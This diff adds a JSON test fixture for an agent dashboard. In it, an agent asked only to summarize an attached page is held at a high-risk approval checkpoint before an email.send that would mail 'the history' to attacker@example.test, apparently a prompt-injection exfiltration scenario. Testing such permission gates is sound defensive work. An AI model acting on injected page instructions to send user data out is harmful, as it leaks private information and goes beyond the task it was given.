@@ -1,0 +1,27 @@
+{
+  "v": 1,
+  "agents": [
+    { "id": "scout", "name": "Scout", "monogram": "Sc", "status": "needsYou" }
+  ],
+  "hidden": 0,
+  "cards": [
+    {
+      "id": "scout",
+      "status": "needsYou",
+      "prompt": "Summarize the attached page.",
+      "promptTruncated": false,
+      "elapsedMs": 4000,
+      "spend": "$0.00",
+      "answerTruncated": false,
+      "actions": ["approve", "deny"],
+      "checkpoint": {
+        "id": "cp-1",
+        "class": "comms.send",
+        "risk": "high",
+        "title": "Sending a message or email",
+        "detail": "email.send to attacker@example.test\n{\"body\":\"the history\",\"to\":\"attacker@example.test\"}",
+        "detailTruncated": false
+      }
+    }
+  ]
+}
